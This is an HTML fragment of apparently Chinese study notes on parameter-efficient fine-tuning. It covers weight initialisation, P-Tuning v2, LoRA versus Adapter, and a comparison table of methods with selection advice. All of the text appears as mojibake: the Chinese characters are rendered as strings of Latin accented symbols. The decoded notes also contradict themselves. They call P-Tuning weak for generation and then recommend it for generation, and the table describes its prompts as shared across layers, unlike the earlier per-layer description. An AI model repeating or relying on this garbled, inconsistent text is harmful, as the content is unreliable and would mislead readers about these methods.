<li>Xavier åˆå§‹åŒ–ï¼ˆä¹Ÿå« Glorot åˆå§‹åŒ–ï¼‰
<ol>
<li>æ ¸å¿ƒå®šä½ï¼šé€‚åˆç”¨ã€ŒSigmoid/Tanhã€æ¿€æ´»å‡½æ•°çš„å±‚ï¼ˆæ¯”å¦‚æ—©æœŸ Transformer çš„éƒ¨åˆ†å±‚ï¼‰</li>
<li>é€»è¾‘ï¼šè®©æƒé‡çš„åˆå§‹å€¼æ»¡è¶³ â€œè¾“å…¥å±‚çš„æ–¹å·® = è¾“å‡ºå±‚çš„æ–¹å·®â€â€”â€” ç®€å•è¯´å°±æ˜¯ â€œè¾“å…¥ç»è¿‡æƒé‡å˜æ¢åï¼Œæ•°å€¼è§„æ¨¡ä¸å˜â€ã€‚</li>
<li>æƒé‡ä»<strong>å‡åŒ€åˆ†å¸ƒ</strong>ä¸­éšæœºé‡‡æ ·ï¼Œé‡‡æ ·èŒƒå›´ç”± â€œè¾“å…¥ç»´åº¦ (in) + è¾“å‡ºç»´åº¦ (out)â€ å†³å®šï¼šèŒƒå›´ï¼š<code>[-âˆš(6/(in+out)), âˆš(6/(in+out))]</code></li>
</ol>
</li>
<li>He åˆå§‹åŒ–ï¼ˆä¹Ÿå« Kaiming åˆå§‹åŒ–ï¼‰
<ol>
<li>æ ¸å¿ƒå®šä½ï¼šé€‚åˆç”¨ã€ŒReLU/Leaky ReLUã€æ¿€æ´»å‡½æ•°çš„å±‚ï¼ˆæ¯”å¦‚ CNNã€ç°ä»£ Transformer çš„ FFN å±‚ï¼‰ã€‚</li>
<li>é€»è¾‘ï¼šReLU ä¼šæŠŠè´Ÿæ•°å˜æˆ 0ï¼Œç›¸å½“äº â€œä¸¢äº†ä¸€åŠä¿¡æ¯â€ï¼Œæ‰€ä»¥ He åˆå§‹åŒ–åœ¨ Xavier åŸºç¡€ä¸Š â€œè¡¥äº†è¿™ä¸€åŠâ€â€”â€” è®©è¾“å‡ºæ–¹å·® = 2Ã— è¾“å…¥æ–¹å·®ã€‚</li>
<li>æƒé‡ä»<strong>æ­£æ€åˆ†å¸ƒ</strong>ä¸­éšæœºé‡‡æ ·ï¼Œå‡å€¼ä¸º 0ï¼Œæ ‡å‡†å·®ç”± â€œè¾“å…¥ç»´åº¦ (in)â€ å†³å®šï¼šæ ‡å‡†å·®ï¼š<code>âˆš(2/in)</code></li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li>åˆå§‹åŒ–æç¤ºå‘é‡
<ul>
<li>ç®€å•ç‰ˆï¼šéšæœºåˆå§‹åŒ–ï¼›</li>
<li>é«˜æ•ˆç‰ˆï¼šç”¨ä»»åŠ¡ç›¸å…³è¯çš„è¯åµŒå…¥åˆå§‹åŒ–ï¼ˆå¦‚åˆ†ç±»ä»»åŠ¡ç”¨ â€œå¥½ / åâ€ çš„å‘é‡ï¼‰ï¼Œå‡å°‘è®­ç»ƒæ­¥æ•°ã€‚
<ul>
<li>ç›´æ¥ä»é¢„è®­ç»ƒæ¨¡å‹ä¸­æå–æç¤ºå‘é‡</li>
</ul>
</li>
</ul>
</li>
<li>è¾“å…¥æ‹¼æ¥ï¼š
<ul>
<li>åŸå§‹æ–‡æœ¬ â†’ ç»è¿‡æ¨¡å‹çš„è¯åµŒå…¥å±‚ï¼Œç›´æ¥è½¬æˆæ ‡å‡†è¯åµŒå…¥ï¼›</li>
<li>æ¯å±‚éƒ½æŠŠ â€œè™šæ‹Ÿå‰ç¼€å‘é‡ï¼ˆKpã€Vpï¼‰â€ æ‹¼åˆ°åŸå§‹ Key/Value å‰é¢ï¼Œå½¢æˆæ–°çš„è¾“å…¥å¼ é‡ã€‚</li>
</ul>
</li>
<li>å‰å‘è®¡ç®—ï¼šæ¨¡å‹æŒ‰æ­£å¸¸æµç¨‹ç®—æ³¨æ„åŠ›ã€FFNï¼Œä½†æ¯å±‚éƒ½å…ˆçœ‹å‰ç¼€å‘é‡ï¼Œç›¸å½“äº â€œå…ˆè®°ä½ä»»åŠ¡è¦æ±‚å†å¤„ç†æ–‡æœ¬â€ã€‚
<ol>
<li>å…ˆè®°ä½æ˜¯å› ä¸ºæ‹¼æ¥åœ¨å‘é‡æœ€å‰æ–¹ï¼Œæ³¨æ„åŠ›æœºåˆ¶ä¼šå…ˆæ³¨æ„åˆ°ï¼Œç„¶åèµ·åˆ°å¼•å¯¼çš„ä½œç”¨</li>
</ol>
</li>
<li>è®¡ç®—æŸå¤±ï¼šç”¨ä»»åŠ¡æ ‡ç­¾ï¼ˆå¦‚åˆ†ç±»çš„ â€œæ­£ / è´Ÿâ€ï¼‰ç®—æŸå¤±ï¼Œåªé’ˆå¯¹æç¤ºå‘é‡çš„è¾“å‡ºã€‚</li>
<li>åŠ è½½å‚æ•°ï¼šä¸ç”¨åŠ¨å¤§æ¨¡å‹ï¼ŒåªåŠ è½½è®­ç»ƒå¥½çš„ â€œæ¯å±‚è™šæ‹Ÿå‰ç¼€å‘é‡â€ã€‚</li>
<li>ç”Ÿæˆè¾“å‡º
<ul>
<li>æ–°æ–‡æœ¬ â†’ è½¬è¯åµŒå…¥ï¼›</li>
<li>æ¯å±‚è‡ªåŠ¨æ‹¼æ¥å‰ç¼€å‘é‡ï¼Œæ¨¡å‹æŒ‰è®­ç»ƒå¥½çš„ â€œå¼•å¯¼é€»è¾‘â€ è®¡ç®—ï¼Œè¾“å‡ºç»“æœã€‚
<ul>
<li>å¯ä»¥ç±»æ¯” T5 æ¨¡å‹è®­ç»ƒï¼Œå‰ç¼€å‘é‡ä¼šé€šè¿‡è®­ç»ƒå­¦ä¹ åˆ°å¦‚ä½•åŒ¹é…åˆé€‚çš„æ–‡æœ¬</li>
</ul>
</li>
<li>æ³¨ï¼šæœ‰ç‚¹ç±»ä¼¼å‰ç¼€è°ƒæ•´ï¼Œä¸åŒçš„æ–‡æœ¬åŠ å…¥è®­ç»ƒå¥½çš„ä¸åŒå‰ç¼€å‘é‡ï¼Œåªæ˜¯ä¸€ä¸ªåœ¨è¾“å…¥å±‚æ·»åŠ ï¼Œä¸€ä¸ªæ˜¯æ¯å±‚è‡ªæ³¨æ„åŠ›å±‚éƒ½æ·»åŠ </li>
</ul>
</li>
<li>é€šä¿—è¯´ï¼šè®­ç»ƒæ˜¯ â€œæ•™æ¯å±‚æ€ä¹ˆçœ‹æç¤ºâ€ï¼Œæ¨ç†æ˜¯ â€œç›´æ¥ç”¨å­¦ä¼šçš„æç¤ºå¼•å¯¼æ¯å±‚å¹²æ´»â€ã€‚</li>
</ol>
</li>
<li>æ ¸å¿ƒä¼˜åŠ¿ï¼ˆç¢¾å‹ v1 å’Œå¾ˆå¤šæ–¹æ³•ï¼‰
<ol>
<li>æ•ˆæœå¼ºï¼šæ¯å±‚éƒ½æ’å‰ç¼€ï¼Œå¼•å¯¼åŠ›è´¯ç©¿æ¨¡å‹å…¨ç¨‹ï¼Œ<strong>å°æ ·æœ¬åœºæ™¯ä¸‹æ•ˆæœè¿½å¹³å…¨é‡å¾®è°ƒ</strong>ï¼Œæ¯” LoRA/Adapter åœ¨å°æ ·æœ¬ä»»åŠ¡ä¸Šæ›´ç¨³ï¼›</li>
<li>ç»“æ„æç®€ï¼šå»æ‰äº† v1 çš„ BiLSTM ç¼–ç å™¨ï¼Œç›´æ¥æ’å‰ç¼€å‘é‡ï¼Œä»£ç å®ç°æ¯” v1 ç®€å•ï¼Œè®­ç»ƒé€Ÿåº¦æ›´å¿«ï¼›</li>
<li>æ˜¾å­˜å ç”¨ä½ï¼šåªè®­å‰ç¼€å‘é‡ï¼Œå‚æ•°é‡åªæœ‰åŸæ¨¡å‹çš„ 0.1%~3%ï¼Œæ™®é€š 8G æ˜¾å¡å°±èƒ½è·‘ 7B æ¨¡å‹çš„å¾®è°ƒï¼›</li>
<li>å¤šä»»åŠ¡çµæ´»ï¼šä¸€ä¸ªæ¨¡å‹é…å¤šå¥—å‰ç¼€ï¼Œæ¢ä»»åŠ¡åªæ¢å‰ç¼€ï¼Œä¸ç”¨é‡æ–°è®­ç»ƒæ¨¡å‹ã€‚</li>
</ol>
</li>
<li>é€‚ç”¨åœºæ™¯ï¼ˆç²¾å‡†åŒ¹é…ä¼˜åŠ¿ï¼‰
<ol>
<li>å°æ ·æœ¬ / æä½æ ·æœ¬ä»»åŠ¡
<ol>
<li>æ¯”å¦‚åªæœ‰ 10~100 æ¡æ ‡æ³¨æ•°æ®çš„åˆ†ç±»ä»»åŠ¡ï¼ˆåŒ»ç–—æ–‡æœ¬åˆ†ç±»ã€æ³•å¾‹æ–‡ä¹¦åˆ†ç±»ï¼‰ï¼Œå…¶ä»–æ–¹æ³•å®¹æ˜“è¿‡æ‹Ÿåˆï¼ŒP-tuning v2 èƒ½ç¨³ä½æ•ˆæœã€‚</li>
</ol>
</li>
<li>å¤šä»»åŠ¡æ··åˆåœºæ™¯
<ol>
<li>æ¯”å¦‚ä¸€ä¸ªæ¨¡å‹è¦åŒæ—¶åš â€œæƒ…æ„Ÿåˆ†ç±» + æ–‡æœ¬åŒ¹é… + æ„å›¾è¯†åˆ«â€ï¼Œæ¢ä»»åŠ¡åªåŠ è½½å¯¹åº”å‰ç¼€ï¼Œåˆ‡æ¢æˆæœ¬æä½ã€‚</li>
</ol>
</li>
<li>å¤§æ¨¡å‹è½»é‡åŒ–å¾®è°ƒ
<ol>
<li>æ¯”å¦‚ 7B/13B è§„æ¨¡çš„æ¨¡å‹ï¼Œå…¨é‡å¾®è°ƒæ˜¾å­˜ä¸å¤Ÿï¼Œç”¨ P-tuning v2 èƒ½ä»¥æä½æ˜¾å­˜æˆæœ¬å®Œæˆé€‚é…ã€‚</li>
</ol>
</li>
</ol>
</li>
<li>P-turning v1 å’Œ v2 çš„è®¾è®¡å¯¼è‡´çš„ç¼ºç‚¹ï¼š
<ol>
<li>ç”Ÿæˆç±»ä»»åŠ¡æ•ˆæœä¸€èˆ¬
<ul>
<li>è®¾è®¡åˆè¡·æ˜¯ä¸ºäº†åˆ†ç±»ä»»åŠ¡ï¼Œåšæ–‡æœ¬ç”Ÿæˆï¼ˆå†™æ–‡æ¡ˆã€å†™æ‘˜è¦ï¼‰æ—¶ï¼Œæ•ˆæœä¸å¦‚å‰ç¼€è°ƒæ•´ â€”â€” å› ä¸ºç”Ÿæˆéœ€è¦é•¿åºåˆ—å¼•å¯¼ï¼Œè€Œ P-tuning çš„å‰ç¼€æ˜¯é’ˆå¯¹æ¯å±‚æ³¨æ„åŠ›çš„ï¼Œå¯¹ç”Ÿæˆçš„è¿è´¯æ€§æ”¯æŒä¸è¶³ã€‚</li>
</ul>
</li>
<li>å¯¹å‰ç¼€é•¿åº¦æ•æ„Ÿ
<ul>
<li>å‰ç¼€é•¿åº¦é€‰å¾—ä¸å¥½ï¼ˆå¤ªçŸ­å¼•å¯¼åŠ›ä¸å¤Ÿï¼Œå¤ªé•¿å‚æ•°é‡çˆ†ç‚¸ï¼‰ï¼Œæ•ˆæœä¼šæ–­å´–å¼ä¸‹é™ï¼›è€Œ LoRA åªéœ€è¦è°ƒä¸€ä¸ª<code>r</code>ï¼ˆç§©ï¼‰å‚æ•°ï¼Œå®¹é”™ç‡æ›´é«˜ã€‚</li>
</ul>
</li>
<li>æ¨ç†æ—¶è¦é¢å¤–åŠ è½½å‰ç¼€
<ul>
<li>è™½ç„¶å‰ç¼€ä½“ç§¯å°ï¼Œä½†ç›¸æ¯” PETï¼ˆä¸ç”¨åŠ è½½é¢å¤–å‚æ•°ï¼‰ï¼Œéƒ¨ç½²æ—¶è¦å¤šå­˜ä¸€å¥—å‰ç¼€æ–‡ä»¶ï¼›è€Œ LoRA å¯ä»¥æŠŠä½ç§©çŸ©é˜µåˆå¹¶åˆ°åŸæ¨¡å‹ï¼Œéƒ¨ç½²æ›´çœå¿ƒã€‚</li>
</ul>
</li>
<li>æ·±å±‚ä»»åŠ¡è°ƒè¯•éº»çƒ¦
<ul>
<li>æ¯å±‚éƒ½æœ‰å‰ç¼€ï¼Œå‡ºé—®é¢˜æ—¶å¾ˆéš¾å®šä½æ˜¯å“ªä¸€å±‚çš„å‰ç¼€å‡ºäº†é—®é¢˜ï¼›è€Œ Adapter æ˜¯æ¯å±‚æ’ä¸€ä¸ªç‹¬ç«‹æ¨¡å—ï¼Œè°ƒè¯•æ›´æ–¹ä¾¿ã€‚</li>
</ul>
</li>
</ol>
</li>
</ol>
<h4 data-id="heading-10">8 åŒºåˆ«ï¼š</h4>
<ol>
<li>
<p>LoRAä¸é€‚é…å™¨è°ƒæ•´çš„ä¸»è¦åŒºåˆ«åœ¨äº(æ¯”è¾ƒé‡è¦)ï¼š</p>
<ol>
<li>LoRAï¼šåœ¨æ¨¡å‹çš„æƒé‡çŸ©é˜µä¸­å¼•å…¥ä½ç§©çŸ©é˜µæ¥å®ç°å¾®è°ƒã€‚è¿™äº›ä½ç§©çŸ©é˜µä½œä¸ºåŸæœ‰æƒé‡çŸ©é˜µçš„å¤–æŒ‚é¡¹ï¼Œåœ¨å®é™…è®¡ç®—æ—¶å¯¹åŸæœ‰æƒé‡çŸ©é˜µçš„è¾“å‡ºè¿›è¡Œè°ƒæ•´ã€‚(æ”¹åŸæƒé‡çš„å±€éƒ¨ï¼Œæ¨ç†æ›´å¿«)</li>
<li>é€‚é…å™¨è°ƒæ•´ï¼šé€šè¿‡åœ¨æ¨¡å‹å„å±‚ä¸­æ·»åŠ å°å‹ç¥ç»ç½‘ç»œæ¨¡å—ï¼Œå³â€œé€‚é…å™¨â€ï¼Œæ¥å®ç°å¾®è°ƒã€‚é€‚é…å™¨ç‹¬ç«‹äºæ¨¡å‹çš„ä¸»ä½“ç»“æ„ï¼Œä»…é€‚é…å™¨çš„å‚æ•°åœ¨å¾®è°ƒè¿‡ç¨‹ä¸­æ›´æ–°ï¼Œè€Œæ¨¡å‹çš„å…¶ä»–é¢„è®­ç»ƒå‚æ•°ä¿æŒä¸å˜ã€‚å’Œ LoRA ä¸€æ ·æ˜¯åœ¨è¾“å‡ºçš„æ—¶å€™å¤šäº†å¤–æŒ‚é¡¹(å¤šä»»åŠ¡å­¦ä¹ å’Œç®¡ç†ä¸Šæ›´ä¸ºç›´è§‚ï¼Œæ¨ç†é€Ÿåº¦ç¨æ…¢)</li>
<li>æ˜¾å­˜å ç”¨æ–¹é¢å·®ä¸å¤š</li>
</ol>
</li>
<li>
<p>æç¤ºè°ƒæ•´ä¸P-Tuningçš„ä¸»è¦åŒºåˆ«åœ¨äºï¼š</p>
<ol>
<li>æç¤ºè°ƒæ•´ï¼šä½¿ç”¨é™æ€çš„ã€å¯è®­ç»ƒçš„è™šæ‹Ÿæ ‡è®°åµŒå…¥ï¼Œåœ¨åˆå§‹åŒ–åä¿æŒå›ºå®šï¼Œé™¤éåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­æ›´æ–°ã€‚è¿™ç§æ–¹æ³•ç›¸å¯¹ç®€å•ï¼Œå› ä¸ºå®ƒåªæ¶‰åŠè°ƒæ•´ä¸€ç»„å›ºå®šçš„åµŒå…¥å‚æ•°ï¼Œåœ¨å¤„ç†å¤šç§ä»»åŠ¡æ—¶è¡¨ç°è‰¯å¥½ï¼Œä½†å¯èƒ½åœ¨å¤„ç†ç‰¹åˆ«å¤æ‚æˆ–éœ€è¦ç»†ç²’åº¦æ§åˆ¶çš„ä»»åŠ¡æ—¶å—é™</li>
<li>P-Tuningï¼šä½¿ç”¨ä¸€ä¸ªå¯è®­ç»ƒçš„LSTMæ¨¡å‹ï¼ˆç§°ä¸ºæç¤ºç¼–ç å™¨prompt_encoderï¼‰æ¥åŠ¨æ€ç”Ÿæˆè™šæ‹Ÿæ ‡è®°åµŒå…¥ï¼Œå…è®¸æ ¹æ®è¾“å…¥æ•°æ®çš„ä¸åŒç”Ÿæˆä¸åŒçš„åµŒå…¥ï¼Œæä¾›æ›´é«˜çš„çµæ´»æ€§å’Œé€‚åº”æ€§ï¼Œé€‚åˆéœ€è¦ç²¾ç»†æ§åˆ¶å’Œç†è§£å¤æ‚ä¸Šä¸‹æ–‡çš„ä»»åŠ¡ã€‚è¿™ç§æ–¹æ³•ç›¸å¯¹å¤æ‚ï¼Œå› ä¸ºå®ƒæ¶‰åŠä¸€ä¸ªé¢å¤–çš„LSTMæ¨¡å‹æ¥ç”Ÿæˆè™šæ‹Ÿæ ‡è®°åµŒå…¥ã€‚</li>
</ol>
</li>
<li>
<p>é™¤æ­¤ä¹‹å¤–çš„æ–¹æ³•ï¼š</p>
<ol>
<li>é™¤äº†ä»¥ä¸ŠPEFTï¼Œå½“å‰è¿˜å­˜åœ¨PILLï¼ˆPluggable Instruction Language Learningï¼‰ã€SSFï¼ˆScaling &amp; Shifting Your Featuresï¼‰(<strong>IAÂ³ï¼ˆé€šè¿‡ç¼©æ”¾æ¿€æ´»å€¼æ¥å¾®è°ƒï¼‰ã€BitFitï¼ˆä»…åç½®é¡¹å¾®è°ƒæ–°å…´æŠ€æœ¯ï¼‰</strong>)ç­‰å…¶ä»–ç±»å‹çš„å¾®è°ƒæ–¹æ³•ã€‚
<ol>
<li>PILLæ˜¯PEFTçš„ä¸€ä¸ªç‰¹å®šå®ç°ï¼Œç‰¹åˆ«å…³æ³¨äºå¦‚ä½•é€šè¿‡æ’å…¥å¯è®­ç»ƒçš„æ¨¡å—æˆ–æ’ä»¶æ¥æå‡æ¨¡å‹çš„ä»»åŠ¡é€‚åº”æ€§ã€‚è¿™äº›æ’ä»¶è¢«è®¾è®¡ä¸ºä¸åŸå§‹æ¨¡å‹ååŒå·¥ä½œï¼Œä»¥æé«˜æ¨¡å‹åœ¨å¤„ç†ç‰¹å®šä»»åŠ¡æ—¶çš„æ•ˆç‡å’Œæ•ˆæœã€‚</li>
<li>SSFæ ¸å¿ƒæ€æƒ³æ˜¯å¯¹æ¨¡å‹çš„ç‰¹å¾ï¼ˆå³æ¨¡å‹å±‚çš„è¾“å‡ºï¼‰è¿›è¡Œç¼©æ”¾ï¼ˆScalingï¼‰å’Œä½ç§»ï¼ˆShiftingï¼‰ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯é€šè¿‡è°ƒæ•´ç‰¹å¾çš„æ¯”ä¾‹å’Œåç§»é‡æ¥ä¼˜åŒ–æ¨¡å‹çš„æ€§èƒ½ã€‚</li>
</ol>
</li>
<li>è¿™ç§æ–¹æ³•å¯ä»¥åœ¨æ”¹å–„æ¨¡å‹å¯¹ç‰¹å®šä»»åŠ¡çš„å“åº”æ—¶ï¼Œä¸éœ€è¦è°ƒæ•´æˆ–é‡æ–°è®­ç»ƒæ¨¡å‹ä¸­çš„æ‰€æœ‰å‚æ•°ï¼Œä»è€Œåœ¨èŠ‚çœè®¡ç®—èµ„æºçš„åŒæ—¶ä¿æŒæˆ–æå‡æ¨¡å‹æ€§èƒ½ã€‚è¿™å¯¹äºå¤„ç†å¤§è§„æ¨¡æ¨¡å‹ç‰¹åˆ«æœ‰æ•ˆï¼Œå› ä¸ºå®ƒå‡å°‘äº†è®­ç»ƒå’Œè°ƒæ•´æ‰€éœ€çš„èµ„æºå’Œæ—¶é—´ã€‚</li>
</ol>
</li>
<li>
<p>å¾®è°ƒç­–ç•¥ï¼š</p>
<ol>
<li>å¾®è°ƒä¸è¿ç§»å­¦ä¹ ï¼šå¾®è°ƒå®é™…ä¸Šæ˜¯è¿ç§»å­¦ä¹ (å®è§‚æ¦‚å¿µ)çš„ä¸€ä¸ªå®ä¾‹ï¼Œå…¶ä¸­é¢„è®­ç»ƒçš„æ¨¡å‹ï¼ˆé€šå¸¸åœ¨å¤§å‹é€šç”¨æ•°æ®é›†ä¸Šè®­ç»ƒï¼‰è¢«ç”¨ä½œç‰¹å®šä»»åŠ¡çš„èµ·ç‚¹ã€‚è¿™ç§æ–¹æ³•ä½¿å¾—å³ä½¿æ˜¯å¯¹äºå°æ•°æ®é›†çš„ä»»åŠ¡ï¼Œä¹Ÿå¯ä»¥å®ç°é«˜æ•ˆçš„å­¦ä¹ </li>
<li>é€‰æ‹©å¾®è°ƒç­–ç•¥ï¼šé€‰æ‹©å“ªç§å¾®è°ƒæ–¹æ³•å–å†³äºå¤šä¸ªå› ç´ ï¼ŒåŒ…æ‹¬ä»»åŠ¡çš„å¤æ‚æ€§ã€å¯ç”¨çš„æ•°æ®é‡ã€è®¡ç®—èµ„æºå’ŒæœŸæœ›çš„æ€§èƒ½ã€‚
<ol>
<li>ä¾‹å¦‚ï¼Œå¯¹äºéœ€è¦ç»†ç²’åº¦æ§åˆ¶çš„å¤æ‚ä»»åŠ¡ï¼ŒP-Tuning v2æˆ–LSTMåŸºç¡€çš„P-Tuningå¯èƒ½æ›´é€‚åˆã€‚è€Œå¯¹äºè®¡ç®—èµ„æºæœ‰é™çš„æƒ…å†µï¼Œå¯ä»¥é€‰æ‹©LoRAæˆ–Adapter Tuningç­‰æ–¹æ³•ã€‚</li>
</ol>
</li>
<li>å¾®è°ƒä¸æ¨¡å‹æ³›åŒ–èƒ½åŠ›ï¼šå¾®è°ƒæ—¶éœ€è¦æ³¨æ„çš„ä¸€ä¸ªå…³é”®é—®é¢˜æ˜¯ä¿æŒæ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›ã€‚è¿‡åº¦çš„å¾®è°ƒå¯èƒ½ä¼šå¯¼è‡´æ¨¡å‹å¯¹ç‰¹å®šè®­ç»ƒæ•°æ®è¿‡æ‹Ÿåˆï¼Œè€Œå¿½ç•¥äº†å…¶åœ¨å®é™…åº”ç”¨ä¸­çš„æ³›åŒ–èƒ½åŠ›ã€‚</li>
</ol>
</li>
</ol>
<h4 data-id="heading-11">9 åœºæ™¯é€‚é…æ€»ç»“ï¼š</h4>
<ol>
<li><strong>å†…å­˜ä¸é€Ÿåº¦æƒè¡¡</strong>
<ul>
<li>æè‡´å†…å­˜ä¼˜åŒ–ï¼šQLoRAï¼ˆ5%~10%ï¼‰&gt; P-Tuning v2ï¼ˆ3%~10%ï¼‰&gt; Prefix Tuningï¼ˆ5%~15%ï¼‰&gt; LoRAï¼ˆ10%~30%ï¼‰&gt; Adapterï¼ˆ15%~40%ï¼‰</li>
<li>æ¨ç†é€Ÿåº¦ä¼˜å…ˆçº§ï¼šFull Fine-tuning â‰ˆ LoRAï¼ˆåˆå¹¶åï¼‰&gt; QLoRA &gt; P-Tuning v2 &gt; Prefix Tuning &gt; Adapter</li>
</ul>
</li>
<li><strong>æ–¹æ³•é—´å…³ç³»</strong>
<ul>
<li>LoRA ä¸ QLoRAï¼šQLoRA é€šè¿‡é‡åŒ–è¿›ä¸€æ­¥å‹ç¼©å†…å­˜ï¼Œæ˜¯ LoRA åœ¨è¶…å¤§è§„æ¨¡æ¨¡å‹åœºæ™¯çš„å»¶ä¼¸</li>
<li>Adapter ä¸ Prefix/P-Tuningï¼šAdapter ä¾§é‡ç‰¹å¾å˜æ¢ï¼ŒPrefix/P-Tuning ä¾§é‡ä»»åŠ¡æç¤ºï¼Œåˆ†åˆ«é€‚é…ä¸åŒä»»åŠ¡ç±»å‹</li>
<li>æ‰€æœ‰ PEFT æ–¹æ³•å‡ä»¥ â€œå†»ç»“ä¸»å¹²ã€è®­ç»ƒå¢é‡å‚æ•°â€ ä¸ºæ ¸å¿ƒï¼ŒåŒºåˆ«åœ¨äºå‚æ•°æ³¨å…¥ä½ç½®ä¸å˜æ¢æ–¹å¼</li>
</ul>
</li>
<li><strong>é€‰æ‹©å»ºè®®</strong>
<ul>
<li>é€šç”¨ä»»åŠ¡ä¼˜å…ˆé€‰ LoRAï¼ˆå¹³è¡¡æ€§èƒ½ä¸æ•ˆç‡ï¼‰</li>
<li>è¶…å¤§æ¨¡å‹é€‰ QLoRAï¼ˆæ˜¾å­˜æ˜¯æ ¸å¿ƒçº¦æŸï¼‰</li>
<li>å¤šä»»åŠ¡é€‰ Adapterï¼ˆçµæ´»åˆ‡æ¢ï¼‰</li>
<li>ç”Ÿæˆä»»åŠ¡é€‰ Prefix/P-Tuning v2ï¼ˆæç¤ºå¼•å¯¼èƒ½åŠ›å¼ºï¼‰</li>
<li>èµ„æºå……è¶³æ—¶ç”¨å…¨å‚æ•°å¾®è°ƒï¼ˆè¿½æ±‚æé™æ€§èƒ½ï¼‰</li>
</ul>
</li>
</ol>





























































<table><thead><tr><th>æ–¹æ³•</th><th>æ ¸å¿ƒæ€è·¯</th><th>é€‚ç”¨åœºæ™¯</th><th>æ¨ç†é€Ÿåº¦</th><th>ä¼˜ç¼ºç‚¹</th><th>ä¸å…¶ä»–æ–¹æ³•å…³ç³»</th></tr></thead><tbody><tr><td>LoRA</td><td>å†»ç»“ä¸»å¹²ï¼Œè®­ç»ƒä½ç§©çŸ©é˜µï¼ˆA/Bï¼‰ï¼Œæ¨ç†æ—¶åˆå¹¶åˆ°åŸæƒé‡</td><td>é€šç”¨ NLP ä»»åŠ¡ï¼ˆåˆ†ç±» / ç”Ÿæˆï¼‰ã€ä¸­ç­‰è§„æ¨¡æ¨¡å‹ã€å¤šä»»åŠ¡å¿«é€Ÿåˆ‡æ¢</td><td>æ— é¢å¤–å»¶è¿Ÿ</td><td>âœ… å‚æ•°å°‘ï¼ˆ0.1%-5%ï¼‰ã€æ€§èƒ½æ¥è¿‘å…¨é‡ï¼›âŒ å¯¹ä½ç§©å‡è®¾æ•æ„Ÿ</td><td>Adapter çš„ä½ç§©æ›¿ä»£ï¼Œæ¯” Prefix Tuning æ€§èƒ½æ›´ç¨³</td></tr><tr><td>QLoRA</td><td>4-bit é‡åŒ–ä¸»å¹² + LoRAï¼Œè®­ç»ƒæ—¶å†»ç»“é‡åŒ–æƒé‡</td><td>è¶…å¤§æ¨¡å‹ï¼ˆ65B+ï¼‰ã€æ˜¾å­˜å—é™åœºæ™¯ï¼ˆå•å¡è®­ç»ƒï¼‰ã€è¾¹ç¼˜éƒ¨ç½²</td><td>æ¥è¿‘ LoRA</td><td>âœ… æè‡´æ˜¾å­˜èŠ‚çœã€æ”¯æŒè¶…å¤§è§„æ¨¡æ¨¡å‹ï¼›âŒ è®­ç»ƒé€Ÿåº¦ç•¥æ…¢ï¼ˆ-15%~-30%ï¼‰</td><td>LoRA çš„é‡åŒ–å¢å¼ºç‰ˆï¼Œå…¼é¡¾ä½å†…å­˜ä¸æ€§èƒ½</td></tr><tr><td>Adapter</td><td>æ’å…¥ç“¶é¢ˆå±‚ï¼ˆå¦‚ Downâ†’ReLUâ†’Upï¼‰ï¼Œä»…è®­ç»ƒæ–°å¢æ¨¡å—</td><td>å¤šä»»åŠ¡å¹¶è¡Œã€è·¨æ¨¡æ€é€‚é…ã€è½»é‡çº§æ¨¡å‹å®šåˆ¶</td><td>å»¶è¿Ÿ + 10%~30%ï¼ˆé¢å¤–å‰å‘è®¡ç®—ï¼‰</td><td>âœ… æ¨¡æ€è§£è€¦å¥½ã€å¤šä»»åŠ¡çµæ´»ï¼›âŒ ç»“æ„ä¾µå…¥æ€§ã€æ¨ç†å»¶è¿Ÿ</td><td>ä¸ LoRA äº’è¡¥ï¼Œé€‚åˆå¤šä»»åŠ¡ä½†ä¸é€‚åˆä½å»¶è¿Ÿåœºæ™¯</td></tr><tr><td>Prefix Tuning</td><td>è®­ç»ƒä»»åŠ¡ç›¸å…³å‰ç¼€å‘é‡ï¼Œæ³¨å…¥æ³¨æ„åŠ›å±‚</td><td>æ–‡æœ¬ç”Ÿæˆï¼ˆæ‘˜è¦ / å¯¹è¯ï¼‰ã€å°æ ·æœ¬å­¦ä¹ </td><td>å»¶è¿Ÿ + 5%~15%ï¼ˆå‰ç¼€å¤„ç†ï¼‰</td><td>âœ… ç”Ÿæˆä»»åŠ¡æ€§èƒ½ä¼˜ã€å‚æ•°æå°‘ï¼›âŒ è¶…å‚æ•æ„Ÿï¼ˆé•¿åº¦ / ä½ç½®ï¼‰</td><td>Prompt Tuning çš„ç»“æ„åŒ–å‡çº§ï¼Œé€‚åˆç”Ÿæˆä»»åŠ¡</td></tr><tr><td>P-Tuning v2</td><td>ç»Ÿä¸€æç¤ºå±‚è®¾è®¡ï¼Œè·¨å±‚å…±äº«æç¤ºå‘é‡</td><td>å¤æ‚é—®ç­”ã€åˆ›æ„å†™ä½œã€é¢†åŸŸçŸ¥è¯†å¢å¼º</td><td>å»¶è¿Ÿ + 5%~10%</td><td>âœ… æç¤ºæ³›åŒ–å¼ºã€é€‚é…å¤šä»»åŠ¡ï¼›âŒ è®­ç»ƒç¨³å®šæ€§ä¾èµ–è¶…å‚</td><td>Prefix Tuning çš„æ”¹è¿›ç‰ˆï¼Œè§£å†³æç¤ºå†²çªé—®é¢˜</td></tr><tr><td>Full Fine-tuning</td><td>æ‰€æœ‰å‚æ•°å¯è®­ç»ƒï¼Œæ— ç»“æ„æ”¹åŠ¨</td><td>é¢†åŸŸæ·±åº¦å®šåˆ¶ï¼ˆåŒ»ç–— / æ³•å¾‹ï¼‰ã€æµ·é‡æ•°æ®åœºæ™¯</td><td>åŸºå‡†é€Ÿåº¦ï¼ˆæ— é¢å¤–å¼€é”€ï¼‰</td><td>âœ… æ€§èƒ½ä¸Šé™é«˜ï¼›âŒ æˆæœ¬æé«˜ã€æ˜“è¿‡æ‹Ÿåˆ</td><td>æ‰€æœ‰ PEFT æ–¹æ³•çš„æ€§èƒ½å‚è€ƒåŸºå‡†</td></tr></tbody></table>
<ol>
<li>
<p>æ–¹æ³•é€šç”¨çš„å¯é€‰å¢å¼ºæŠ€å·§ï¼š</p>
<ol>
<li>
<p>å¯¹æ¯”å¾®è°ƒï¼ˆContrastive Fine-Tuningï¼‰ï¼šè®©æ¨¡å‹"åˆ†æ¸…å¥½å"</p>
<ol>
